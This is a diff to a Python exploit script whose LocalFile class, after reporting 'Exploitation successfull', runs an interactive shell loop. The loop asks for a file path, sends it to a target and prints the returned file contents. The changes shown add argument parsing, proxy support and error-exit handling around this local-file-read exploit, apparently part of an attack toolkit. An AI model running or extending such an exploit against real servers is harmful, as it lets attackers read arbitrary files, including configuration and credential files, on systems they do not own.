@@ -1,5 +1,13 @@
-import requests, dotenv
+import requests, dotenv, sys
+from pathlib import Path
 dotenv.load_dotenv(dotenv_path="../.env")
+
+PYTHON_PATH = Path(__file__).parent.parent
+
+sys.path.append(str(PYTHON_PATH))
+from config import parse_args, is_success
+args, proxy = parse_args()
+
 
 class LocalFile:
     def __init__(self, url):
@@ -12,6 +20,7 @@ class LocalFile:
             return False
         
         print(f"Exploitation successfull\nSide note: To quit, just enter stop ദ്ദി(｡•̀ ,<)~✩‧₊")
+        error_occured = False
         while True:
             try:
                 payload_unfiltered = input("Enter location of file to see: ")
@@ -29,12 +38,16 @@ class LocalFile:
                 print(file_upload_result.text)
             except KeyboardInterrupt:
                 print("\n\nKeyBoard Interuption. Exiting shell...")
-                break
+                error_occured = True
             except EOFError:
                 print("\nExiting shell...")
-                break
+                error_occured = True
             except Exception as e:
                 print(f"Error: {e}")
+                error_occured = True
+            finally: 
+                if not is_success(self) or error_occured:
+                    return False
         return True
 
         
